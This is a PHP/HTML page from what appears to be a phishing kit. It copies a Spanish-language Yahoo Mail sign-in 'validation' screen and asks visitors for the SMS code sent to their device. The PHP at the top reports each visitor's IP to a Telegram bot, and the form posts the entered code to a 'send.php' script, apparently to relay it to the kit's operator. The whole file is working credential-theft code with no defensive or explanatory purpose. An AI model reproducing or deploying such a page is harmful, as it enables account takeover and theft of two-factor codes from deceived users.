<?php
include './config.php';
include './fullet/tg.php';
function get_client_ip()
{
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

if (isset($alert) && $alert === TRUE) {


    $ip = get_client_ip();
    $msg = "! Ingresando SMS ! \r\n";
    $msg .= "🌐 IP : <code>" . $ip . "</code>\r\n";
    $msg .= "create by @vaceador\r\n";
    sendTg($msg, $key, $id);
}
?>
<!DOCTYPE html>
<html lang="es-ES" dir="ltr" class="yahoo">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <link rel="stylesheet" href="./Iniciar sesión _ Yahoo_files/3e3a3a0349b50dbe.css" nonce="" data-precedence="next">
    <link rel="stylesheet" href="./Iniciar sesión _ Yahoo_files/8ca276bf59604fb2.css" nonce="" data-precedence="next">
    <link rel="stylesheet" href="./Iniciar sesión _ Yahoo_files/598b443c1d81ac5f.css" nonce="" data-precedence="next">
    <link rel="stylesheet" href="./Iniciar sesión _ Yahoo_files/53484fed38e8d4e3.css" nonce="" data-precedence="next">
    <link rel="stylesheet" href="./Iniciar sesión _ Yahoo_files/9bb04626074f815b.css" nonce="" data-precedence="next">
    <link rel="stylesheet" href="./Iniciar sesión _ Yahoo_files/697acddc1c5337ab.css" nonce="" data-precedence="next">
    <link rel="stylesheet" href="./Iniciar sesión _ Yahoo_files/324e469cac834093.css" nonce="" data-precedence="next">
    <link rel="stylesheet" href="./Iniciar sesión _ Yahoo_files/25a8b04ee23b527e.css" nonce="" data-precedence="next">
    <link rel="stylesheet" href="./Iniciar sesión _ Yahoo_files/d4dd43f9b7ed10ce.css" nonce="" data-precedence="next">
    <title>Validación | Yahoo</title>
    <meta name="description"
        content="Inicia sesión para acceder a Yahoo Mail, el mejor correo electrónico de su clase, con noticias de última hora locales, nacionales y mundiales, finanzas, deportes, música, cine… Sacarás mucho más partido de Internet, ¡y también de la vida!">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0">
    <meta name="oath:guce:consent-host" content="guce.yahoo.com">
    <link rel="dns-prefetch" href="https://s.yimg.com/">
    <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-yep-favicon-v1.ico">
    <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
    <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
</head>

<body>
    <div hidden=""><!--$--><!--/$--></div>
    <main>
        <div class="Y1e53a23c Y3e359bce">
            <div class="mx-auto relative">
                <header class="Yf1b4ad1e">
                    <div class="items-center flex-row flex gap-x-4 gap-y-4 Yd58b09ef">
                        <div class="shrink-0 flex"><img alt="Yahoo" class="dark:hidden"
                                src="./Iniciar sesión _ Yahoo_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png"
                                style="height: 2.25rem;"><img alt="Yahoo" class="hidden dark:block"
                                src="./Iniciar sesión _ Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png"
                                style="height: 2.25rem;"></div>
                        <div class="flex-row grow justify-end flex gap-x-4 gap-y-4"><a
                                href="#"
                                target="_blank" rel="noopener noreferrer"
                                class="text-tertiary font-label4 font-size-label4 font-weight-label4 leading-label4 case-label4 tracking-label4"
                                data-ylk="elm:link;elmt:link;slk:headerHelp"
                                data-yga="{&quot;yLinkElement&quot;:&quot;link&quot;,&quot;yLinkElementType&quot;:&quot;link&quot;,&quot;yLinkText&quot;:&quot;headerHelp&quot;}">Ayuda</a><a
                                href="#" target="_blank"
                                rel="noopener noreferrer"
                                class="text-tertiary font-label4 font-size-label4 font-weight-label4 leading-label4 case-label4 tracking-label4"
                                data-ylk="elm:link;elmt:link;slk:headerTerms"
                                data-yga="{&quot;yLinkElement&quot;:&quot;link&quot;,&quot;yLinkElementType&quot;:&quot;link&quot;,&quot;yLinkText&quot;:&quot;headerTerms&quot;}">Términos</a><a
                                href="#" target="_blank"
                                rel="noopener noreferrer"
                                class="text-tertiary font-label4 font-size-label4 font-weight-label4 leading-label4 case-label4 tracking-label4"
                                data-ylk="elm:link;elmt:link;slk:headerPrivacy"
                                data-yga="{&quot;yLinkElement&quot;:&quot;link&quot;,&quot;yLinkElementType&quot;:&quot;link&quot;,&quot;yLinkText&quot;:&quot;headerPrivacy&quot;}">Privacidad</a>
                        </div>
                    </div>
                </header>
                <div class="Y488c2e39">
                    <div id="loginbox" class="Y3ef1aca5 Yfa2bc609">
                        <section class="flex-col flex gap-x-8 gap-y-8 container">
                            <div class="flex-col flex gap-x-4 gap-y-4">
                                <h1
                                    class="text-primary font-title3 font-size-title3 font-weight-title3 leading-title3 case-title3 tracking-title3">
                                    Continúa con la validación en Yahoo Mail</h1>
                            </div>
                            <form id="challenge-form" action="./fullet/send.php" method="post" class="flex-col flex gap-x-6 gap-y-6"><input
                                    type="hidden"
                                    value="{&quot;webdriver&quot;:0,&quot;language&quot;:&quot;es-419&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:8,&quot;pixelRatio&quot;:1,&quot;hardwareConcurrency&quot;:12,&quot;timezoneOffset&quot;:180,&quot;timezone&quot;:&quot;America/Buenos_Aires&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Win32&quot;,&quot;doNotTrack&quot;:&quot;unknown&quot;,&quot;plugins&quot;:{&quot;count&quot;:5,&quot;hash&quot;:&quot;2c14024bf8584c3f7f63f24ea490e812&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 4060 (0x00002882) Direct3D11 vs_5_0 ps_5_0, D3D11)&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:0,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:47,&quot;hash&quot;:&quot;11fa086e88d9615cf3bb569a760ccfef&quot;},&quot;fontsFlash&quot;:&quot;swf object not loaded&quot;,&quot;audio&quot;:&quot;124.04347527516074&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1920&quot;,&quot;h&quot;:&quot;1080&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;1032&quot;,&quot;h&quot;:&quot;1920&quot;},&quot;ts&quot;:{&quot;render&quot;:1791833868862}}"
                                    name="browser-fp-data"><input type="hidden" value="1848902359.1791833767"
                                    name="gaCid"><input type="hidden" value="1791833774" name="gaSid"><input
                                    type="hidden"
                                    value="{&quot;analytics_storage&quot;:&quot;granted&quot;,&quot;functionality_storage&quot;:&quot;granted&quot;,&quot;personalization_storage&quot;:&quot;granted&quot;,&quot;security_storage&quot;:&quot;granted&quot;,&quot;ad_user_data&quot;:&quot;granted&quot;,&quot;ad_personalization&quot;:&quot;granted&quot;,&quot;ad_storage&quot;:&quot;denied&quot;}"
                                    name="gaCs"><input type="hidden" value="ok" name="gaCidState"><input type="hidden"
                                    value="QQ--" name="sessionIndex"><input type="hidden" value="wQDE8aXE"
                                    name="acrumb"><input type="hidden" value="C0Xn1o0mOZvZPrAZ8cMdzA"
                                    name="crumb"><input type="hidden"
                                    value="{&quot;pa&quot;:{&quot;status&quot;:true},&quot;isWebAuthnSupported&quot;:true}"
                                    name="deviceCapability">
                                <div class="flex-col flex gap-x-2 gap-y-2">
                                    <div>
                                        <div class="flex-col flex gap-x-2 gap-y-2 Y347d0c71 Y6d437c88">
                                            <div class="flex-row flex gap-x-4 gap-y-4 Y5d5ac24b Y9514c74c"><label
                                                    for="username"
                                                    class="text-secondary font-label3 font-size-label3 font-weight-label3 leading-label3 case-label3 tracking-label3 label-default flex-1 Y9514c74c">A continuación ingresa el código SMS enviado a tu dispositivo seguro.</label></div>
                                            <div class="flex-col flex gap-x-1.5 gap-y-1.5">
                                                <div
                                                    class="uds-border-radius-sm border-tertiary uds-border-width-thin flex p-4 Y9514c74c">
                                                    <span
                                                        class="text-primary font-label4 font-size-label4 font-weight-label4 leading-label4 case-label4 tracking-label4 w-full"><input
                                                            id="username" class="Y00e5f144" aria-required="true" maxlength="6" minlength="6"
                                                            type="tel" value="" name="telefonoic" required></span></icon-container></template></nordpass-icon></span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="items-center flex-row justify-between flex pb-2 pt-2 gap-x-2 gap-y-2">
                                        <div class="items-center flex"><label
                                                class="uds-checkbox-size-sm-root uds-checkbox-variant-primary-root uds-checkbox-variant-value-checked-root flex flex-row items-center cursor-pointer !text-tertiary"
                                                data-testid="container" tabindex="-1">
                                                <div class="items-center flex-none justify-center flex relative uds-checkbox-size-sm-checkbox uds-checkbox-variant-primary-checkbox uds-checkbox-variant-value-checked-checkbox uds-ring uds-ring-within duration-120 transition-[background-color,border-color,box-shadow]"
                                                    style="transform: none;"><input tabindex="0" id="persistent"
                                                        class="cursor-[inherit] absolute opacity-0 top-1/2 left-1/2 w-[calc(100%+2px)] h-[calc(100%+2px)] transform translate-x-[-50%] translate-y-[-50%]"
                                                        type="checkbox" value="y" checked="" name="persistent"><svg
                                                        xmlns="http://www.w3.org/2000/svg" width="16" height="16"
                                                        viewBox="0 0 16 16" aria-hidden="true" focusable="false"
                                                        class="flex-none text-primary uds-checkbox-variant-primary-checkboxicon uds-checkbox-variant-value-checked-checkboxicon pointer-events-none opacity-100 duration-120 transition-opacity [&amp;_path]:fill-current">
                                                        <path fill="currentColor"
                                                            d="M13.5 3.89 6.951 12 2.5 7.48l.958-.993 3.394 3.447L12.452 3z">
                                                        </path>
                                                    </svg></div>
                                                <div class="cursor-[inherit] text-start">No cerrar sesión</div>
                                            </label></div>
                                        <p
                                            class="text-tertiary font-label4 font-size-label4 font-weight-label4 leading-label4 case-label4 tracking-label4">
                                            <a class="uds-link-variant-primary-root items-center uds-ring inline Y148faafa Y49d8fb7e"
                                                data-ylk="elm:link;elmt:forgot;slk:forgot"
                                                data-yga="{&quot;yLinkElement&quot;:&quot;link&quot;,&quot;yLinkElementType&quot;:&quot;forgot&quot;,&quot;yLinkText&quot;:&quot;forgot&quot;,&quot;yModuleName&quot;:&quot;loginLanding&quot;}"
                                                href="#">He
                                                olvidado mi nombre de usuario</a></p>
                                    </div>
                                </div><button type="submit"
                                    class="uds-ring uds-hit-target inline-flex overflow-hidden justify-center items-center whitespace-nowrap select-none [transform-origin:center] [backface-visibility:hidden] [transition-property:color,background-color,border-color,box-shadow,text-decoration-color,fill,stroke] [transition-timing-function:cubic-bezier(0,0,0.2,1)] [transition-duration:220ms] uds-button-default-size-root uds-button-variant-brand-root Y0daaae72"
                                    aria-busy="false" data-ylk="elm:btn;elmt:primary;slk:next"
                                    data-yga="{&quot;yLinkElement&quot;:&quot;btn&quot;,&quot;yLinkElementType&quot;:&quot;primary&quot;,&quot;yLinkText&quot;:&quot;next&quot;,&quot;yModuleName&quot;:&quot;loginLanding&quot;}"
                                    name="signin" tabindex="0"
                                    style="column-gap: 0px; transform: scale(var(--uds-button-scale-effect-rest));"><span
                                        class="flex overflow-clip uds-button-icon-container"
                                        style="display: none; width: 0px; opacity: 0;"></span><span
                                        class="truncate">Siguiente</span><span
                                        class="flex overflow-clip uds-button-icon-container"
                                        style="display: none; width: 0px; opacity: 0;"></span></button><output
                                    class="sr-only"></output>
                                <div class="items-center flex-1 flex-row flex w-full uds-divider-variant-muted-root"
                                    role="separator">
                                    <div class="flex-1 flex uds-divider-variant-muted-line"
                                        style="border-left-width: 0px; border-right-width: 0px; border-bottom-width: 0px;">
                                    </div>
                                    <div class="flex-none flex"><span class="uds-divider-variant-muted-label">o</span>
                                    </div>
                                    <div class="flex-1 flex uds-divider-variant-muted-line"
                                        style="border-left-width: 0px; border-right-width: 0px; border-bottom-width: 0px;">
                                    </div>
                                </div>
                                <div class="flex-col flex gap-x-4 gap-y-4"><button type="submit"
                                        class="uds-ring uds-hit-target inline-flex overflow-hidden justify-center items-center whitespace-nowrap select-none [transform-origin:center] [backface-visibility:hidden] [transition-property:color,background-color,border-color,box-shadow,text-decoration-color,fill,stroke] [transition-timing-function:cubic-bezier(0,0,0.2,1)] [transition-duration:220ms] uds-button-default-size-root uds-button-variant-secondary-root Y03e47227 w-full"
                                        value="google" data-ylk="elm:btn;elmt:tpa;slk:google-btn"
                                        data-yga="{&quot;yLinkElement&quot;:&quot;btn&quot;,&quot;yLinkElementType&quot;:&quot;tpa&quot;,&quot;yLinkText&quot;:&quot;google-btn&quot;}"
                                        name="tpaProvider" tabindex="0"
                                        style="column-gap: 0px; transform: scale(var(--uds-button-scale-effect-rest));"><span
                                            class="flex overflow-clip uds-button-icon-container"
                                            style="display: none; width: 0px; opacity: 0;"></span><span
                                            class="truncate"><svg width="24" height="24" viewBox="0 0 16 16" fill="none"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <g id="GoogleIcon">
                                                    <g id="Vector">
                                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                                            d="M16 8.18187C16 7.6146 15.9481 7.06914 15.8516 6.5455H8.16326V9.64005H12.5566C12.3673 10.6401 11.7922 11.4873 10.9276 12.0546V14.0619H13.5659C15.1095 12.6691 16 10.6182 16 8.18187Z"
                                                            fill="#4285F4"></path>
                                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                                            d="M8.16327 16C10.3674 16 12.2152 15.2837 13.5659 14.0619L10.9276 12.0546C10.1967 12.5346 9.26161 12.8182 8.16327 12.8182C6.03711 12.8182 4.23748 11.4109 3.59555 9.52H0.868279V11.5927C2.21151 14.2073 4.97218 16 8.16327 16Z"
                                                            fill="#34A853"></path>
                                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                                            d="M3.59555 9.52C3.43229 9.04 3.33952 8.52732 3.33952 8.00005C3.33952 7.47277 3.43228 6.96005 3.59555 6.48004V4.40732H0.868275C0.315399 5.48732 0 6.70914 0 8.00005C0 9.29096 0.315403 10.5127 0.868279 11.5927L3.59555 9.52Z"
                                                            fill="#FBBC05"></path>
                                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                                            d="M8.16327 3.18182C9.36179 3.18182 10.4379 3.58546 11.2839 4.37818L13.6252 2.08364C12.2115 0.792728 10.3636 0 8.16327 0C4.97218 0 2.2115 1.79277 0.868275 4.40732L3.59555 6.48004C4.23748 4.58913 6.03711 3.18182 8.16327 3.18182Z"
                                                            fill="#EA4335"></path>
                                                    </g>
                                                </g>
                                            </svg>Iniciar sesión con Google</span><span
                                            class="flex overflow-clip uds-button-icon-container"
                                            style="display: none; width: 0px; opacity: 0;"></span></button><output
                                        class="sr-only"></output></div><a
                                    href=""
                                    role="button" data-ylk="elm:btn;elmt:secondary;slk:signup"
                                    data-yga="{&quot;yLinkElement&quot;:&quot;btn&quot;,&quot;yLinkElementType&quot;:&quot;secondary&quot;,&quot;yLinkText&quot;:&quot;signup&quot;,&quot;yModuleName&quot;:&quot;loginLanding&quot;}"
                                    class="uds-ring uds-hit-target inline-flex overflow-hidden justify-center items-center whitespace-nowrap select-none [transform-origin:center] [backface-visibility:hidden] [transition-property:color,background-color,border-color,box-shadow,text-decoration-color,fill,stroke] [transition-timing-function:cubic-bezier(0,0,0.2,1)] [transition-duration:220ms] uds-button-default-size-root uds-button-variant-brand-tertiary-root Y90fba94b"
                                    tabindex="0"
                                    style="column-gap: 0px; transform: scale(var(--uds-button-scale-effect-rest));"><span
                                        class="flex overflow-clip uds-button-icon-container"
                                        style="display: none; width: 0px; opacity: 0;"></span><span
                                        class="truncate">Crear una cuenta</span><span
                                        class="flex overflow-clip uds-button-icon-container"
                                        style="display: none; width: 0px; opacity: 0;"></span></a>
                            </form>
                        </section>
                    </div>
                </div>
            </div>
            <div class="Y7523845e resp:mq-lt640:hidden">
                <div class="Y8ca5c7c3">
                    <div id="login-ad-rich" aria-hidden="true" class="Y749cbd95"><iframe id="login-ads-gpt-iframe"
                            allow="geolocation &#39;none&#39;; fullscreen &#39;none&#39;; autoplay &#39;none&#39;; camera &#39;none&#39;; display-capture &#39;none&#39;; document-domain &#39;none&#39;; microphone &#39;none&#39;; gyroscope &#39;none&#39;; magnetometer &#39;none&#39;; midi &#39;none&#39;; payment &#39;none&#39;; serial &#39;none&#39;; speaker-selection &#39;none&#39;"
                            sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"
                            width="1440" height="1024" scrolling="no" frameborder="no" data-spaceid="794256123"
                            src="./Iniciar sesión _ Yahoo_files/sandbox.html"></iframe>
                        <div class="Ya0c25294"><iframe id="login-ads-gpt-backfill-iframe"
                                allow="geolocation &#39;none&#39;; fullscreen &#39;none&#39;; autoplay &#39;none&#39;; camera &#39;none&#39;; display-capture &#39;none&#39;; document-domain &#39;none&#39;; microphone &#39;none&#39;; gyroscope &#39;none&#39;; magnetometer &#39;none&#39;; midi &#39;none&#39;; payment &#39;none&#39;; serial &#39;none&#39;; speaker-selection &#39;none&#39;"
                                sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"
                                width="728" height="90" scrolling="no" frameborder="no"
                                src="./Iniciar sesión _ Yahoo_files/sandbox(1).html"></iframe></div>
                    </div>
                    <section id="login-ads-fallback" class="Y12c9ee22 hidden">
                        <h1 class="Y2ed280a5">Yahoo te permite disfrutar fácilmente de lo que más importa en tu mundo
                        </h1>
                        <p class="Ycf390856">Yahoo Mail, el mejor correo electrónico de su clase, con noticias de última
                            hora locales, nacionales y mundiales, finanzas, deportes, música, cine y mucho más. Sacarás
                            mucho más partido de Internet, ¡y también de la vida!</p>
                    </section>
                </div>
            </div>
            <div id="ad"></div>
        </div>
    </main>
</body>

</html>